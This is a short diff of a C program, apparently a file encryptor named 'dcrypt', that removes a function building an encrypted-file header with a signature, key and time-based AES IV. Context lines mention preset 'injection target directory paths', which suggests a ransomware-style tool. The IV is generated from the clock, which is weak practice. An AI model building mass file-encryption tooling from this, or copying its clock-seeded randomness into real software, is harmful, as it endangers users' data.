@@ -1,37 +1,5 @@
 #include "dcrypt.h"
 
-void init_dcrypt_header(t_env *env)
-{
-	// Set the file signature
-	memcpy(env->dcrypt_header.signature, DC_SIGNATURE, DC_MAGICNBR_SIZE);
-	// Get the encryption key that will be used to encrypt/decrypt
-	const unsigned char *encryption_key = get_encryption_key(env);
-	if (!encryption_key) {
-		if (env->modes & DC_VERBOSE)
-			fprintf(
-				stderr,
-				FMT_ERROR "Failed to get the encryption key. Aborting...\n"
-			);
-		exit(EXIT_FAILURE);
-	}
-
-	/*
-	 * In encryption mode, generate the IV used by AES encryption.
-	 * The IV will be saved inside the custom header on the encrypted file.
-	 */
-
-	if (!(env->modes & DC_REVERSE)) {
-		unsigned char	*iv_key = generate_time_based_rand_key_nanosec(
-			DC_KEYCHARSET, DC_AES_KEY_SIZE
-		);
-
-		// Copy the IV key to the custom header
-		memcpy(env->dcrypt_header.iv_key, iv_key, DC_AES_KEY_SIZE);
-
-		free(iv_key);
-	}
-}
-
 void print_results(t_env *env)
 {
 	printf(
@@ -57,9 +25,6 @@ int main(int argc, char *argv[])
 
 	// Parse the arguments given through the commannd line
 	parse_argv(&env, argc, argv);
-
-	// Init the header that will be placed at the top of the file
-	init_dcrypt_header(&env);
 
 	// Declare the injection target directory paths
 	char *target_dir_paths[DC_TARGET_ARRAY_SIZE] = DC_TARGET_PATHS;
